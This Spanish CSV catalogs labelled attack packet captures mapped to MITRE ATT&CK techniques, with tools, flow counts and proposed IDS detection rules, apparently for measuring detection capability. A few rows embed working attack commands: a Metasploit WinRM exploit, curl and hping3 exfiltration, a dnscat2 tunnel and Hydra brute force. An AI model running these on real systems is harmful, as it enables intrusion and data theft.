TÁCTICA,OTRAS TÁCTICAS,ID TÁCTICA,TÉCNICA,ID TÉCNICA,SUBTÉCNICA,ID SUBTÉCNICA,ATAQUE,HERRAMIENTA,FICHERO PCAP,PROTOCOLO BASE DE ATAQUE,Nº TOTAL DE FLUJOS,Nº DE FLUJOS CON ATAQUE/S,Nº DE FLUJOS CON ATAQUE/S COLATERAL/ES,Nº DE MENSAJES DE RED CON ATAQUE/S,Nº ATAQUES (INSTANCIAS) TOTALES,Nº ATAQUES (INSTANCIAS) PRINCIPALES,Nº ATAQUES (INSTANCIAS) COLATERALES,ATAQUE/S COLATERAL/ES - EXPLICACIÓN,DETECTABLE POR PATRONES,MECANISMO DE DETECCIÓN,DETALLES DE IMPLEMENTACIÓN DE ATAQUE,PROCESO DE GENERACIÓN DE PCAP,VALIDACIÓN DE PCAP,ANÁLISIS DE DETECCIONES DE PCAP (Snort),FORMATO PCAPNG,DETECTABILIDAD,ATAQUES COLATERALES,VERIFICACIÓN MTU MÁXIMA,ERROR TCP_REPLAY,CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL,NIVEL DE ATAQUE (Contexto de Ataque),JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque),NIVEL DE ATAQUE (MODELO OSI),TRAMAS > 4000 Bytes,USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN
Command and Control,-,TA0040,Data Obfuscation,T1001,Steganography,T1001.002,Inserción de información confidencial en una imagen JPG,"Covenant, SSH, scp, Powershell",T1001.002-Data_obfuscation_steganography_[4].pcapng,SSH,1,1,0,1,1,1,0,-,NO,"Detección por anomalías y/o estegoanálisis, envío de imágenes o ficheros con formato poco común entre equipos, existencia de ficheros comprimidos sospechosos, etc.",-,Manual [4] / 3.18,Manual [4] / B.18,Manual [4] / 4.18,1,1,0,1,0,1,LV1,El uso de técnicas esteganográficas para ocultar datos es unívoca. No puede confundirse con actividad legítima,L3,0,0
Command and Control,-,TA0040,Data Obfuscation,T1001,Protocol Impersonation,T1001.003,Falsificación de protocolos de conexión segura como SSL o TLS,FakeTLS (raykaryshyn Github),T1001.003-Data_obfuscation_protocol_impersonation_[4].pcapng,TLS,1,1,0,1,1,1,0,-,SI,Regla genérica que analice el contenido y la estructura de los paquetes enviados para detectar una falsificación de protocolo. Adicionalmente se puede detectar con una regla personalizada que compruebe el campo Server Name y mediante DNS asegure si se corresponde con la dirección IP a la que se está accediendo.,-,Manual [4] / 3.17,Manual [4] / B.17,Manual [4] / 4.17,1,1,0,1,0,1,LV1,La falsificación del protocolo TLS para acceder al equipo víctima es únivoca. No puede confundirse con actividad legítima.,L3,0,1
Credential Access,-,TA0006,OS Credential Dumping,T1003,DCSync,T1003.006,Obtención de credenciales del usuario krbtgt (Usuario Kerberos Active Directory),mimikazt,T1003-Os_credential_dumping_dcsync_[4].pcapng,DCERPC,3,1,0,1,1,1,0,-,SI,Regla compuesta que detecte una llamada DCERPC Bind a la API DRSUAPI seguida de una llamada a la función DsGetNCChanges,-,Manual [4] / 3.11,Manual [4] / B.11,Manual [4] / 4.11,1,1,0,1,0,1,LV1,La obtención de credenciales del usuario krbtgt de manera no autorizada supone siempre un ataque,L3,0,1
Command and Control,-,TA0040,Fallback Channels,T1008,-,-,Traspaso de canal primario C2 a canal alternativo,Covenant,T1008-Fallback_channels_[4].pcapng,SMB2,6,2,1,2,3,2,1,Establecimiento del canal C&C primario mediante Covenant - Command and Control,SI*,"La detección de la creación del canal es posible para este caso concreto, en el que el cortafuegos detecta la creación de ambos canales. Sin embargo, si ambos canales, tanto primario como secundario están establecidos, y no se ha detectado su creación, el cambio de uno a otro es inapreciable por el cortafuegos.",-,Manual [4] / 3.19,Manual [4] / B.19,Manual [4] / 4.19,1,1,0,1,0,1,LV1,La creación de un canal secundario de C&C siempre es un ataque,L3,1,1
Exfiltration,-,TA0010,Exfiltration Over Other Network Medium,T1011,Exfiltration Over Bluetooth,T1011.001,Extracción via Bluetooth,"Covenant, btobex, Bluetooth",T1011-Exfiltration_over_bluetooth_[4].pcapng,BLUETOOTH,1,1,0,1,1,1,0,-,NO,Detección por anomalías en red Bluetooth. Envío y/o recepción de información comprometida por la red Bluetooth,-,Manual [4] / 3.23,Manual [4] / B.23,Manual [4] / 4.23,1,1,0,1,1,1,LV2,El uso de Bluetooth para extraer datos puede darse en contextos legítimos,L2,1,0
Discovery,-,TA0007,Remote System Discovery,T1018,-,-,Descubrimiento de servicios y puertos,nmap,T1018-service_discovery_[3].pcapng,TCP,1002,1002,0,1002,1002,1002,0,-,SI,Regla que detecte envío de mútliples peticiones a un rango de puertos en un tiempo determinado,-,Manual [3] / 3.8.1,Manual [3] / 3.8.1.4,Manual [3] / 3.8.1.5,1,1,0,1,0,1,LV1,"El descubrimiento de servicios, de forma general, se califica como ataque",L3,0,1
Exfiltration,-,TA0010,Automated Exfiltration,T1020,Traffic Duplication,T1020.001,Ejecución de script en Python para activar el reenvío de paquetes en el equipo víctima,"SSH, Scapy",T1020.001-Automated_exfiltration_traffic_duplication_[4].pcapng,SSH,26,1,0,1,1,1,0,-,NO,Detección por anomalías en red que detecte el envío duplicado de paquetes procedentes de un mismo origen interno a la organización,-,Manual [4] / 3.24,Manual [4] / B.24,Manual [4] / 4.24,1,1,0,1,0,1,LV1,La ejecución de un script que habilite el reenvío de paquetes en el equipo víctima es un ataque,L3,0,0
Lateral Movement,-,TA0008,Remote Services,T1021,SSH,T1021.004,Sesión SSH,SSH,T1021-remote_services_ssh_[3].pcapng,SSH,1,1,0,1,1,1,0,-,SI*,"Regla genérica para detectar conexiones SSH entre un orígen y un servidor o destino dentro de la red a proteger. *Este ataque, si bien es detectable por red, es idéntico a un acceso legítimo, por lo que no es posible diferenciar uno de otro (salvo por anomalías relacionadas con direcciones IP o usuarios poco comunes)",-,Manual [3] / 3.8.10,Manual [3] / 3.8.10.4,Manual [4] / 4.1.48,1,1,0,1,0,1,LV2,"El uso de SSH es genérico, no siempre tiene que tratarse de un ataque",L3,0,1
Exfiltration,-,TA0010,Scheduled Transfer,T1029,-,-,Comunicación C2 para el establecimiento de extracción programada,"Covenant, Powershell",T1029-Scheduled_transfer_[4].pcapng,HTTP,9,1,1,1,2,1,1,Establecimiento del canal C&C para la programación de la transferencia - Command and Control,NO,"Detección por anomalías, basada en el descubrimiento de eventos programados que no han sido creados por el usuario.",-,Manual [4] / 3.25,Manual [4] / B.25,Manual [4] / 4.25,1,1,0,1,0,1,LV1,La programación de una exfiltración de datos es siempre un ataque,L3,1,0
Exfiltration,-,TA0010,Data Transfer Size Limits,T1030,-,-,Dividir archivos para realizar transferencias menores a un umbral que provoque alertas,"ftp, split",T1030-Transfer_Size_Limits_[5].pcapng,FTP,68,1,1,1,2,1,1,"En el proceso de ataque se hace uso de un Shell Remoto, pero no es la función principal",NO**,"Dependiendo la forma en la que se envien los archivos, puede ser indetectable. Sin embargo, si utiliza protocolos de transferencia de ficheros (FTP,SMB...) resulta importante monitorizar transferencias con un mismo tamaño de manera concurrente","Transferencia de ficheros mediante FTP, previamente divididos en paquetes de un tamaño constante",Manual [5] / 4.9.1,Manual [5] / C.1,Manual [5] / 5.12.5,1,1,0,1,0,1,LV2,La división en partes para la transferencia de un fichero no necesariamente es un ataque,L3,1,0
Discovery,-,TA0007,System Owner,T1033,-,-,Descubrimiento de sesión de usuario en equipo remoto,"quser, qwinsta",T1033-System_owner_[4].pcapng,DCERPC,13,1,0,1,1,1,0,-,SI,Regla que detecte múltiples interacciones con la API LSM_API_service del servicio RPC desde el mismo equipo origen.,-,Manual [4] / 3.12,Manual [4] / B.12,Manual [4] / 4.12,1,1,0,1,0,1,LV2,El descubrimiento de sesión del usuario en un equipo remoto puede tratarse de una actividad legítima en ciertos contextos,L3,0,1
Collection,-,TA0009,Data from Network Shared Drive,T1039,-,-,Descarga de archivos de interés disponibles en una red compartida,Comando Net Use,T1039-Data_from_network_shared_drive_[4].pcapng,SMB2,3,1,0,1,1,1,0,-,NO,"Detección por anomalías, copia repentina de ficheros compartidos por red.",-,Manual [4] / 3.15,Manual [4] / B.15,Manual [4] / 4.15,1,1,0,1,0,1,LV2,La extracción de datos de un disco compartido es legítimo en según qué contextos,L3,0,1
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Falsa autenticación,Suite aircrack-ng,T1040-Autenticacion_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.1,Manual [1] / E.20,Manual [4] / 4.1.26,1,0,0,1,1,1,LV1,El acceso vía falsa autenticación siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,ChopChop,Suite aircrack-ng,T1040-Chopchop_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.2,Manual [1] / E.21,Manual [4] / 4.1.27,1,0,0,1,1,1,LV1,El uso de la técnica ChopChop siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Fragmentación,Suite aircrack-ng,T1040-Fragmentacion_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.3,Manual [1] / E.22,Manual [4] / 4.1.28,1,0,0,1,1,1,LV1,El uso de la técnica Fragmentacion siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Inundación MAC,Suite aircrack-ng,T1040-Mac_flood_[1].pcapng,IPv4,10674,10674,0,10683,10683,10683,0,-,NO*,"Regla personalizada que detecte un envío masivo de mensajes IPv4 con direcciones incorreladas con la red a proteger, y que aparenten ser completamente aleatorias",-,Manual [1] / 3.2,Manual [1] / E.1,Manual [4] / 4.1.29,1,1,0,1,1,1,LV1,Una inundacion MAC siempre es un ataque,L2 (Switch),0,0
Exfiltration,-,TA0010,Exfiltration Over C2 Channel,T1041,-,-,Exfiltración por canal C2,Caldera,T1041-exfiltration_over_c2_channel_[3].pcapng,HTTP,2,1,0,5,5,5,0,-,NO,Detección por anomalías basada en la sospecha de una extracción de información confidencial por un posible canal C2,-,Manual [3] / 3.8.14,Manual [3] / 3.8.14.4,Manual [3] / 3.8.14.5,1,1,0,1,0,0,LV1,La exfiltración de datos por un canal C2 siempre es un ataque,L3,0,1
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,"Mútliples actividades de escaneo, incluidas el intento de Shell Remoto aprovechando el conocimiento de la red victima","Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1046-C2018_[6].pcapng,-,5,1,1,1,2,1,1,Shell Remoto - T1071,NO**,"En determinadas circunstancias, si el envío de paquetes constituye una amenaza de denegación de servicio, podría detectarse el envío masivo de paquetes",-,Dataset CIC-2018,Manual [4] / B.31,Dataset CIC-2018,1,1,0,1,0,1,LV1,Las actividades de escaneo son ataques,L3,0,0
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,Descubrimiento de servicios y version,Nikto,T1046-Version_services_detection1_[3].pcapng,HTTP,160,159,0,6293,6293,6293,0,-,SI,"Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)",-,Manual [3] / 3.8.3,Manual [3] / 3.8.3.4,Manual [3] / 3.8.3.5,1,1,0,1,0,1,LV1,El descubrimiento de servicios y versiones se considera como ataque,L3,1,1
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,Descubrimiento de servicios y version,nmap,T1046-Version_services_detection2_[3].pcapng,-,65681,65680,0,65737,65737,65737,0,-,SI,"Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)",-,Manual [3] / 3.8.3,Manual [3] / 3.8.3.4,Manual [3] / 3.8.3.5,1,1,0,1,0,0,LV1,El descubrimiento de servicios y versiones se considera como ataque,L3,0,1
Execution,-,TA0002,Windows Management Instrumentation,T1047,-,-,Ejecución de carga por WinRM,Metasploit,T1047-WinRM_[2].pcapng,HTTP,911,450,1,450,451,450,1,Establecimiento de sesión remota mediante Metasploit - T1059,SI,Regla genérica que detecte intento de ejecucion de código shell en un equipo aprovechando vulnerabilidades en WinRM,"Ejecucion de payload en un equipo mediante WinRM. Comando: msfconsole -x ""use exploit/windows/winrm/winrm_script_exec; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; set LPORT 5555; set username administrator; set password vagrant; set force_vbs true; run -z; sessions -c 'cmdkey /list'; sessions -k 1; exit""",Manual [2] / 3.1.4.1,Manual [4] / B.26,Manual [2] / 4.2.1.5,1,1,0,1,0,1,LV1,El aprovechamiento de la vulnerabilidad de la herramienta WinRM hace que este ataque siempre se comporte como tal (aunque la ejecución de código remoto también pueda darse en contextos legítimos),L3,1,1
Exfiltration,-,TA0010,Exfiltration Over Alternative Protocol,T1048,Exfiltration Over Unencrypted Non-C2 Protocol,T1048.003,Exfiltración por FTP,Caldera,T1048.003-Exfiltration_over_FTP_[3].pcapng,TCP,9,1,0,1,1,1,0,-,SI,Regla genérica que detecte FTP STOR,"Exfiltracion de datos utilizando el protocolo FTP. Utilizando caldera y la operacion Advanced Thief. Comando: curl -T stage_to_steal.tar.gz.gpg ftp://172.16.1.2/VictimDirectory/ --user ""dit:dit""",Manual [3] / 3.8.15,Manual [3] / 3.8.15.4,Manual [3] / 3.8.15.5,1,1,0,1,0,0,LV1,El uso de FTP para enviar datos se corresponde con un ataque,L3,0,1
Exfiltration,-,TA0010,Exfiltration Over Alternative Protocol,T1048,Exfiltration Over Unencrypted Non-C2 Protocol,T1048.003,Exfiltración por ICMP,hping3,T1048.003-Exfiltration_over_ICMP_[2].pcapng,ICMP,1,1,0,1,16,16,0,-,SI,Regla genérica que detecte PING inusual.,"Exfiltracion mediante protocolo ICMP. Envia varios echo Request que contienen como datos el contenido de ese fichero. Comando: echo ""Esto es un exfiltración sobre ICMP"" > file;timeout 15s hping3 --file ./file --data 36 192.168.2.2 --icmp",Manual [2] / 3.2.2.1,Manual [4] / B.27,Manual [2] / 4.2.2.2,1,1,0,1,0,1,LV1,El uso de ICMP para enviar datos se corresponde con un ataque,L3,0,1
Persistence,"Execution, Privilege Escalation",TA0003,Scheduled Task/Job,T1053,At,T1053.002,Ejecución de tarea mediante uso de comando at para programar la hora de la ejecución,"Caldera, At",T1053.002-Scheduled_TaskJob_At_[5].pcapng,HTTP,2,1,1,1,2,1,1,Establecimiento de sesión con herramienta Sandcat - T1059,SI,Regla genérica que detecte el uso de comando At para programar tareas a una determinada hora o momento,"El ataque consiste en ejecutar una orden en el equipo remoto mediante el uso de At, programando la hora de ejecución de dicha orden. De esta forma, puede obtenerse persistencia, por ejemplo.",Manual [5] / 4.3.3,Manual [5] / C.42,Manual [5] / 5.5.5,1,1,1,1,0,1,LV1,La programacion de una tarea no necesariamente tiene porque ser un ataque,L3,1,1
Defense Evasion,-,TA0005,Indicator Removal,T1070,Network Share Connection Removal,T1070.005,Eliminación de conexiones establecidas via Network Share en Windows,Comando Net Use,T1070-Indicator_removal_network_share_connection_removal_[4].pcapng,SMB2,1,1,0,1,1,1,0,-,NO,Detección por anomalías basada en desconexión repentina procedente de una dirección de varios recursos compartidos,-,Manual [4] / 3.8,Manual [4] / B.8,Manual [4] / 4.8,1,1,0,1,0,1,LV2,La eliminación de conexiones establecidas con Network Share de Windows es legítima en ciertos contextos,L3,0,1
Command and Control,-,TA0040,Application Layer Protocol,T1071,DNS,T1071.004,Command - Control via DNS,dnscat2,T1071-Tunel_[1].pcapng,DNS,200,10,0,204,204,204,0,-,SI,Regla genérica que detecta uso de dnscat,"Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption",Manual [1] / 5.2.3,Manual [1] / E.17,Manual [4] / 4.1.30,1,1,0,1,0,1,LV1,La ocultación de un canal C&C haciendo uso de un tunel DNS siempre es un ataque,L3,0,1
Discovery,-,TA0007,Account Discovery,T1087,Domain Account,T1087.002,Descubrimiento de cuentas de dominio en entorno Active Directory,"Caldera, net",T1087.002-AccountDiscovery_DomainAccount_[5].pcapng,HTTP,2,1,1,2,3,2,1,Establecimiento de sesión con herramienta Sandcat - T1059,SI,Regla genérica que detecte uso de comandos para enumerar los usuarios o grupos del dominio como net user /domain o net group /domain,Ejecución de comandos mediante CMD para enumerar usuarios y grupos del dominio,Manual [5] / 4.6.2,Manual [5] / C.44,Manual [5] / 5.8.6,1,1,1,1,0,1,LV2,El descubrimiento de cuentas de un dominio AD puede confundirse con actividades de un administrador de red,L3,1,1
Command and Control,-,TA0040,Proxy,T1090,Internal Proxy,T1090.001,Uso de Equipo interno como Proxy para el ataque C2,Covenant,T1090-Proxy_internal_proxy_[4].pcapng,HTTP,23,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,"Aunque sí es detectable la conexión C2 directa con el atacante, no existe un mecanismo de detección concreto que pueda identificar el uso de un proxy, más allá de una detección por anomalías, como la repetición de paquetes, dando a entender que un equipo interno está replicando paquetes, y por tanto está actuando como proxy",-,Manual [4] / 3.20,Manual [4] / B.20,Manual [4] / 4.20,1,1,1,1,0,1,LV1,El uso de un equipo interno como Proxy para comunicaciones C&C siempre es ataque,L3,0,0
Command and Control,-,TA0040,Non-Application Layer Protocol,T1095,-,-,Usar un protocolo que no sea de la capa de Aplicacion en el modelo OSI para esconder la conexión de C2. En este caso utilizamos TCP,"Caldera, manx",T1095-Non_Application_Layer_[3].pcapng,TCP,2,1,1,1,2,1,1,Agente Caldera para el establecimiento de la sesión - Command and Control,SI,Regla genérica que detecte el envío de comandos o comunicaciones C&C en puertos no comunes o haciendo uso de servicios distintos de capa de aplicación,Utilizar la herramienta manx de Caldera para crear sesión C2 mediante TCP,Manual [3] / 3.8.13,Manual [3] / 3.8.13.4,Manual [3] / 3.8.13.5,1,1,1,1,0,1,LV1,El uso de un protocolo distinto de capa de aplicación para ataques C&C siempre es un ataque,L3,1,1
Command and Control,-,TA0040,Web Service,T1102,One-Way Communication,T1102.003,Subida de información confidencial a Workspace de Google Drive,"Covenant, Google Drive API",T1102.003-Web_service-one_way_communication_[4].pcapng,TLS,2,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,"Detección por anomalías, observando actividad inusual relacionada con el uso de servicios web (subidas pesadas de información a la nube, comunicación periódica con servidores web concretos, etc)",-,Manual [4] / 3.21,Manual [4] / B.21,Manual [4] / 4.21,1,1,1,1,0,1,LV2,El uso de un servicio Web para subir datos puede confundirse a menudo con actividades legítimas,L3,1,1
Command and Control,-,TA0040,Multi-Stage Channels,T1104,-,-,Sesión Remota + Ataque C2,"RDP, Covenant",T1104-Multi_stage_channels_[4].pcapng,-,1,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,Detección por anomalías. Investigación de las sesiones establecidas en el equipo atacante (siempre que sea posible) para identificar un rastro de otra dirección.,-,Manual [4] / 3.22,Manual [4] / B.22,Manual [4] / 4.22,1,0,1,1,0,1,LV1,El uso de varias fases y frentes de ataque en una comunicación C&C es siempre un ataque,L3,1,0
Command and Control,-,TA0040,Ingress Tool Transfer,T1105,-,-,Transferencia de archivos de un servidor C2 a un equipo previamente comprometido,"Metasploit, FTP",T1105-Ingress_Tool_Transfer_[5].pcapng,FTP,7,1,0,1,1,1,0,-,SI,"Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.","Servidor FTP en el servidor C2. A través de la conexión del atacante a la víctima, usando el comando ftp transferimos herramientas desde el servidor C2 a la víctima",Manual [5] / 4.8.1,Manual [5] / C.2,Manual [5] / 5.11.7,1,1,0,1,0,1,LV1,La transferencia de herramientas de ingreso siempre es un ataque,L3,1,1
Credential Access,-,TA0006,Brute Force,T1110,Password Spraying,T1110.003,Ataque de fuerza bruta basado en diccionario de contraseñas,wifite,T1110-Diccionario_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.7,Manual [1] / E.26,Manual [4] / 4.2.31,1,0,0,1,1,1,LV1,El uso de fuerza bruta mediante diccionario siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Cracking,T1110.002,Ataque PMKID,"hashcat, hcxpcapngtool, hcxdumptool",T1110-pmkid_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.6.3,Manual [1] / E.25,Manual [4] / 4.2.32,1,0,0,1,1,1,LV1,Un ataque PMKID siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Cracking,T1110.002,PTW/KoreK/FMS,Suite aircrack-ng,T1110-Ptw_korek_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.5,Manual [1] / E.24,Manual [4] / 4.1.33,1,0,0,1,1,1,LV1,Un ataque de fuerza bruta siempre es un ataque,L2 (WEP),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Ataque sobre WPS,"wash, reaver",T1110-Wps_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,-,-,Manual [1] / 4.2.8,Manual [1] / E.27,Manual [4] / 4.1.34,1,0,0,1,0,1,LV1,Un ataque de fuerza bruta siempre es un ataque,L2 (WPA2),0,0
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),FTP - Patator,T1110.001-FTP-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un elevado número de intentos de acceso al servicio FTP de la víctima,-,Dataset CIC-2018,Manual [4] / B.32,Dataset CIC-2018,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via FTP a la víctima siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),Hydra,T1110.001-Hydra_[3].pcapng,SSH,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío msaivo de peticiones de inicio de sesión SSH, alertando de un posible intento de acceso por fuerza bruta",Obtener la contraseña para conectarse por SSH al equipo victima mediante fuerza bruta. Comando: hydra -l dit -P pass.txt 172.16.2.2 -t 4 ssh,Manual [3] / 3.8.9,Manual [3] / 3.8.9.4,Manual [3] / 3.8.9.5,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via SSH a la víctima siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Brute Force,T1110,Password Guessing,T1110.001,Obtención de contraseña por fuerza bruta (adivinación),SSH - Patator,T1110.001-SSH-C2018_[6].pcapng,SSH,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío msaivo de peticiones de inicio de sesión SSH, alertando de un posible intento de acceso por fuerza bruta",-,Dataset CIC-2018,Manual [4] / B.33,Dataset CIC-2018,1,1,0,1,0,1,LV1,El uso de fuerza bruta para acceder via SSH a la víctima siempre es un ataque,L3,0,1
Defense Evasion,-,TA0005,Modify Registry,T1112,-,-,Modificación del Registro de forma remota,reg (Remoto),T1112-Modify_registry_[4].pcapng,WINREG,15,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes con protocolo WINREG o Remote Registry Service,-,Manual [4] / 3.9,Manual [4] / B.9,Manual [4] / 4.9,1,1,0,1,0,1,LV2,La modificación del registro de forma remota en ciertos contextos puede tratarse de actividad legítima,L3,0,1
Collection,-,TA0009,Email Collection,T1114,Remote Email Collection,T1114.002,Recolección de correos electrónicos de un servidor Microsoft Exchange haciendo uso de credenciales robadas,PowerShell,T1114-Email_collection_remote_email_collection_[4].pcapng,HTTP,10,3,0,3,3,3,0,-,SI,Regla genérica que detecte el intento de extracción de información relacionada con los correos electrónicos de una empresa alojados en un servidor Microsoft Exchange,-,Manual [4] / 3.16,Manual [4] / B.16,Manual [4] / 4.16,1,1,0,1,0,1,LV2,La recolección de correos electrónicos de un servidor Microsoft Exchange puede tratarse de una acción legítima en algunos contextos,L3,1,1
Command and Control,-,TA0040,Data Encoding,T1132,Standard Encoding,T1132.001,Codificacion de mensajes entre la victima y el C2 Server mediante Base64,"Metasploit, curl, base64",T1132.001-Standard_Encoding_[5].pcapng,HTTP,10,5,1,5,5,5,0,-,NO,Deteccion por anomalias,Servidor HTTP en el C2 Server. Intercambio de mensajes entre la victima y atacante mediante base64,Manual [5] / 4.8.2,Manual [5] / C.3,Manual [5] / 5.11.8,1,1,0,1,0,1,LV1,La codificación en base 64 de un canal c2 siempre es un ataque,L3,1,0
Initial Access,Persistence,TA0001,External Remote Services,T1133,-,-,Acceso a red VPN desde dispositivo no autorizado con credenciales robadas,OpenVPN,T1133-External_remote_services_[4].pcapng,-,32,1,0,1,1,1,0,-,NO***,"Existen varias variantes.
 Circunstancias concretas del ataque: el atacante realiza alguna interacción posterior una vez ha logrado acceder a la red (aplicable a esta técnica) como un escaneo de red o mensajes de anuncio de Host.
 Reglas personalizadas: regla que compruebe si las direcciones IP involucradas en los paquetes se corresponden con las autorizadas dentro de la red VPN (debe ser configurada manualmente).
","Acceso a red VPN, sin interacciones adicionales más allá de las naturales al propio acceso",Manual [4] / 3.3,Manual [4] / B.3,Manual [4] / 4.3,1,1,0,1,0,1,LV2,El acceso a una red VPN es una acción legítima en algunos contextos,L3,0,0
Persistence,-,TA0003,Browser Extensions,T1176,-,-,Instalación de Plugin en Navegador Chrome que reenvía información relacionada con búsquedas del usuario a un servidor,Malicious-browser-extension,T1176-Browser-extension_[4].pcapng,HTTP,217,212,0,212,212,212,0,-,NO,"Detección por anomalías basada en flujos de datos hacia direcciones no relacionadas con las búsquedas, normalmente en formato de objetos JavaScript",-,Manual [4] / 3.7,Manual [4] / B.7,Manual [4] / 4.7,1,1,0,1,0,1,LV1,El uso de una extensión maliciosa que publica información confidencial siempre es un ataque,L3,0,0
Credential Access,-,TA0006,Forced Authentication,T1187,-,-,Forzar intento de autenticación en un servidor para obtener credenciales de acceso,"SMB, NTLMssp-Extract",T1187-Forced_Authentication_[5].pcapng,SMB2,8,1,0,1,3,3,0,-,SI,"Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV",Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas,Manual [5] / 4.5.1,Manual [5] / C.4,Manual [5] / 5.7.4,1,1,0,1,0,1,LV1,Forzar un intento de autenticación siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Forced Authentication,T1187,-,-,Forzar intento de autenticación en un servidor para obtener credenciales de acceso,"SMB, NTLMssp-Extract",T1187-Forced_Authentication2_[5].pcapng,SMB2,3,1,0,1,3,3,0,-,SI,"Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV",Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas,Manual [5] / 4.5.1,Manual [5] / C.4,Manual [5] / 5.7.4,1,1,0,1,0,1,LV1,Forzar un intento de autenticación siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Drive-by Compromise,T1189,-,-,HTML Exploit I - HTML Compilador,"Apache, Shadyantra",T1189-Drive-by_compromise_v1_[4].pcapng,HTTP,4,3,0,3,3,3,0,-,SI,Regla que detecte el aprovechamiento de una vulnerabilidad del navegador Mozilla Firefox para llevar a cabo una compilación de código en la víctima,Carga de página web con exploit HTML para compilar código malware (no ejecutar),Manual [4] / 3.4,Manual [4] / B.4,Manual [4] / 4.4,1,1,0,1,0,1,LV1,El uso de un exploit para compilar código en la víctima siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Drive-by Compromise,T1189,-,-,HTML Exploit II - Descarga de Ejecutable,"Apache, Shadyantra",T1189-Drive-by_compromise_v2_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte la descarga no autorizada de un archivo .exe (ejecutable) en el equipo víctima desde una página web posiblemente fraudulenta,Carga de página web con exploit HTML para descargar malware en formato ejecutable .exe,Manual [4] / 3.4,Manual [4] / B.4,Manual [4] / 4.4,1,1,0,1,0,1,LV2,La descarga no autorizada de un ejecutable no siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Damn Vulnerable Web App (DVWA),T1190-Sql_injection-C2018_[6].pcapng,HTTP,50,35,0,38,38,38,0,-,SI,Regla personalizada que detecte posibles cadenas asociadas a un ataque de inyección SQL en sentencias HTML,-,Dataset CIC-2018,Manual [4] / B.34,Dataset CIC-2018,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
